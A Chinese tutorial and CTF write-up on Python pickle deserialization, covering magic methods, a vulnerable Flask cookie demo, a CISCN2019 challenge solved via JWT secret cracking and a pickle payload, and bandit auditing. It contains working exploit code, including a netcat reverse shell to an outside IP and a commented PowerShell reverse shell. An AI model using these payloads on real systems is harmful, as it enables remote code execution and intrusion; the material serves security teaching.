![1647930974822-5da8c5f6-0e81-4799-a3c9-01e9307d521b.png](http://www.mumuxi8.com/zb_users/upload/2022/04/202204171650208553248952.png)

```plain
#知识点：
1、Python-反序列化函数使用
2、Python-反序列化魔术方法
3、Python-反序列化POP链构造
4、Python-自动化审计bandit使用

#前置知识：
函数使用：
1.文件格式：
pickle.dump(obj, file) : 将对象序列化后保存到文件
pickle.load(file) : 读取文件， 将文件中的序列化内容反序列化为对象
2.字节流：
pickle.dumps(obj) : 将对象序列化成字符串格式的字节流
pickle.loads(bytes_obj) : 将字符串格式的字节流反序列化为对象

魔术方法：
__reduce__()      反序列化时调用
__reduce_ex__()   反序列化时调用
__setstate__()    反序列化时调用
__getstate__()    序列化时调用


各类语言函数：
Java： Serializable Externalizable接口、fastjson、jackson、gson、ObjectInputStream.read、ObjectObjectInputStream.readUnshared、XMLDecoder.read、ObjectYaml.loadXStream.fromXML、ObjectMapper.readValue、JSON.parseObject等
PHP： serialize()、 unserialize() 
Python：pickle marshal PyYAML shelve PIL unzip
```

- 原理-反序列化魔术方法-调用理解

------

```plain
-魔术方法利用：
__reduce__()         反序列化时调用
__reduce_ex__()   反序列化时调用
__setstate__()       反序列化时调用
__getstate__()       序列化时调用
```

\#反序列化魔术方法调用-__reduce__() __reduce_ex__() __setstate__()

```plain
代码块：
class A(object):
    def __reduce__(self):
        print('反序列化调用')
        return (os.system,('calc',))
a = A()
p_a = pickle.dumps(a) //序列化操作
pickle.loads(p_a)     //反序列化操作
print('==========')
print(p_a)

运行后弹出计算机，输出：
反序列化调用
==========
b'\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x04calc\x94\x85\x94R\x94.'

当我们把pickle.loads(p_a)注释时候，只会输出内容，不会弹出计算器
但是为什么print('反序列化调用')这个方法会执行呢？这个魔术方法__reduce__是有条件的，需要一个返回值。参考：https://www.cnblogs.com/angelyan/p/11079267.html
class SerializePerson():
    def __init__(self, name):
        self.name = name
    # 构造 __setstate__ 方法
    def __setstate__(self, name):
        os.system('calc')  # 恶意代码
tmp = pickle.dumps(SerializePerson('tom'))  #序列化
pickle.loads(tmp)  # 反序列化 此时会弹出计算器

执行弹出计算器，把pickle.loads(tmp)注释后，不会有任何反应。
```

\#序列化魔术方法调用-__getstate__

```plain
class A(object):
    def __getstate__(self):
        print('序列化调用')
        os.system('calc')
a = A()
p_a = pickle.dumps(a) //序列化
print('==========')
print(p_a)

弹出计算器，输出：
序列化调用
==========
b'\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x01A\x94\x93\x94)\x81\x94.'
```

\#反序列化安全漏洞产生-DEMO

```plain
class A(object):
    def __init__(self, func, arg):
        self.func = func
        self.arg = arg
        print('This is A')
    def __reduce__(self):
        print('反序列化调用')
        return (self.func, self.arg)
a = A(os.system, ('calc',))
p_a = pickle.dumps(a)  //序列化
pickle.loads(p_a)      //反序列化
print('==========')
print(p_a)


传参：
self.func=os.system
self.arg=calc

弹出计算器，输出
This is A
反序列化调用
==========
b'\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x04calc\x94\x85\x94R\x94.'

如果把calc改为ipconfig，那么就会打印ipconfig的结果。
```

- CTF-反序列化漏洞利用-构造&RCE

------

```plain
环境介绍：利用Python-flask搭建的web应用，获取当前用户的信息，进行展示，在获取用户的信息时，通过对用户数据进行反序列化获取导致的安全漏洞！

-Server服务器：
import pickle
import base64
from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def index():
    try:
        user = base64.b64decode(request.cookies.get('user'))
        user = pickle.loads(user)
        username = user["username"]
    except:
        username = "Guest"
    return "Hello %s" % username
if __name__ == "__main__":
    app.run(
        host='192.168.124.86',
        port=5000,
        debug=True
    )


访问192.168.124.86:5000
输出Hello Guest

那么这个是怎么来的呢？分析代码
```

![1647934359473-21e8a67d-7d0f-438b-bafc-dbf001e92134.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913132841224-1670580628.png)

```plain
访问根目录的时候，就会触发上面的代码，代码接受cookie的值，如果没有则执行except的值，就会输出Hello Guest
user = pickle.loads(user)进行了反序列化，如果cookie有对应的值，则输出。

抓取访问数据包：
GET / HTTP/1.1
Host: 192.168.124.86:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

发现没有cookie这一栏，所以他是输出hello guest
但是在这里没有看到魔术方法，类等。但是python的反序列化跟php和java的反序列化不一样，他的危害更大，只需要用到这个函数，就可以进行构造
思路：
web应用接受cookie里面的user值，对其进行反序列化操作

攻击：
cookie植入user值，user值就是生成的恶意序列化的数据
构造执行计算器的命令代码：
import pickle
import os
import base64


class A(object):
    def __reduce__(self):
        return (os.system,('calc.exe',))

a=A()
p_a = pickle.dumps(a)
p_a = base64.b64encode(p_a)
print (p_a)
输出结果：gASVIAAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAhjYWxjLmV4ZZSFlFKULg==

将输出的值用cookie去发送：Cookie:user=gASVIAAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAhjYWxjLmV4ZZSFlFKULg==
```

![1647937317508-0924bfbc-49c4-45c8-be69-5f014e3cebe3.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913132841234-94082132.png)

```plain
发送，进行了弹窗。同样也可以命令执行

也可以用存脚本进行测试，在

import requests
import pickle
import os
import base64


class exp(object):
    def __reduce__(self):
        #s = """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.46.137",6666); = .GetStream();[byte[]] = 0..65535|%{0};while(( = .Read(, 0, .Length)) -ne 0){; = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(,0, ); = (iex  2>&1 | Out-String );  =  + "PS " + (pwd).Path + "> "; = ([text.encoding]::ASCII).GetBytes();.Write(,0,.Length);.Flush()};.Close()"""
        s='G:/cmd/nc&lcx&curl/nc -e cmd 47.100.168.248 1111'
        return (os.system, (s,))


e = exp()
s = pickle.dumps(e)
print(s)

response = requests.get("http://192.168.124.86:5000/", cookies=dict(
    user=base64.b64encode(s).decode()
))
print(response.content)
```

- CTF-CISCN2019华北-JWT&反序列化

------

```plain
漏洞环境：https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2]ikun

思路：通过提示->寻找LV6->购买修改支付逻辑->绕过admin限制需修改jwt值->爆破jwt密匙->重组jwt值成为admin->购买进入会员中心->源码找到文件压缩源码->Python代码审计反序列化->构造读取flag代码进行序列化打印->提交获取
考点1：JWT 身份验证 攻击点：
https://www.cnblogs.com/vege/p/14468030.html
https://github.com/ck00004/c-jwt-cracker
考点2：Python 代码审计 反序列化：
自动工具：https://github.com/PyCQA/bandit
参考资料：https://github.com/bit4woo/python_sec

打开页面，发现有很多lv4 lv3 查看图片地址/static/img/lv/lv4.png和/static/img/lv/lv3.png，根据推测，lv6一定是/static/img/lv/lv6.png地址。
```

![1647939585028-5a749b7b-d052-4f16-a2af-78d38b89b406.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913132841581-1134518712.png)

```plain
写一个python脚本
1、获取LV6
import requests
for i in range(1,1000):
    url='http://119.45.216.198:8083/shop?page='+str(i)
    result=requests.get(url).content
    try:
        if 'lv6.png' in result.decode('utf-8'):
            print('->'+url+'|yes')
            break
        else:
            print('->' + url + '|no')
    except Exception as e:
        pass
```

![1647939819741-cea91de1-087c-4c60-9c1b-dd2b5c457eea.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913132841898-2062151851.png)

```plain
在181页中已经停止，所以打开181页，发现了lv6
注册一个账户，然后登录
点击购买，发现有优惠价-20%
点击购买，抓取数据包：
```

![1647940166473-dcba65e2-7255-450d-9ea2-eddb52688bb8.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913132841762-782525052.png)

```plain
发现数据包中的值：_xsrf=2%7C5a1f6b7f%7C11cda87164c732d87b83fec367068026%7C1647940092&id=1624&price=1145141919.0&discount=0.8
discount好像是打折的意思，那么修改数据包，
_xsrf=2%7C5a1f6b7f%7C11cda87164c732d87b83fec367068026%7C1647940092&id=1624&price=1145141919.0&discount=0.00000000000000000000000000000008，让他尝试构造

放出去后，发现：该页面，只允许admin访问
所以应该是有身份验证的，session，cookie，jwt等等

抓取数据包发现cookie中的数据：
Cookie: _xsrf=2|7eb73d2c|3565fe22406f648b5f2ba89043aed675|1647940092; JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InhpYW9kaXNlIn0.sp8rXrjACzFQKgQyqaLGvVLCNEYFe6bjYn-M-1PGGnc; commodity_id="2|1:0|10:1647940471|12:commodity_id|8:MTYyNA==|45d9de5c12a60baf2394781a3526daf777245d9d95cb2c2fb4a37e9c0cb87231"

JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InhpYW9kaXNlIn0.sp8rXrjACzFQKgQyqaLGvVLCNEYFe6bjYn-M-1PGGnc

把数据放到解密平台https://jwt.io/中解密，发现用户名是xiaodise
```

![1647940595468-73ac63f9-e24c-4ef7-900f-418d3bfc375e.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913132841725-1075496927.png)

```plain
必须加上秘钥，再给修改的。需要进行爆破
用到脚本c-jwt-cracker
./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InhpYW9kaSJ9.UHCykJtUJ4jeYAWAYFU73QiNhn7mZLUHE7kKo4oJpK8

解密出来： 1Kun
进行重组
```

![1647941423158-503e56ed-383f-44b4-8d33-77b51a331266.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913132842440-1555604857.png)

```plain
得到JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo

修改进入后，查看源代码
```

![1647941659986-ff2405f1-cc93-4418-9175-32de8bf5a404.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913132842190-515648900.png)

```plain
下载源码后，进行全局搜索关键函数render
```

![1647942485510-6be92402-5eda-49ca-b3cd-093fba992ed3.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913132842378-1007290704.png)

```plain
发现反序列化，然后构造payload：
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
print a

这个是用python2写的，也要看网站是什么搭建的，要用相对应的版本（审查元素，或者对应函数使用）

用python2去运行，生成payload：c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.
继续看谁调用了这个函数，在__init__文件中
```

![1647943601058-d7eb58cd-7d98-43aa-b968-ec121469bcd2.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913132842015-823294068.png)

```plain
所以是(r'/b1g_m4mber', AdminHandler)，/b1g_m4mber调用了这个文件

查看这个页面的表单
```

![1647943829637-a3fe9661-2d14-441c-9c85-313a5e93b2c0.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913132841868-1640860657.png)

```plain
所以post提交：become=c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.

得到flag
```

- 代码审计-自动化工具-bandit安装及使用

------

```plain
参考：https://bandit.readthedocs.io/
安装：pip install bandit（直接执行）
linux:
安装后会在当前Python目录下bin
使用：bandit -r 需要审计的源码目录
windows:
安装后会在当前Python目录下script
使用：bandit -r 需要审计的源码目录
```

![1647944944277-90179926-44df-4aad-b7fb-ec7b1beeacf2.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913132842050-1050205946.png)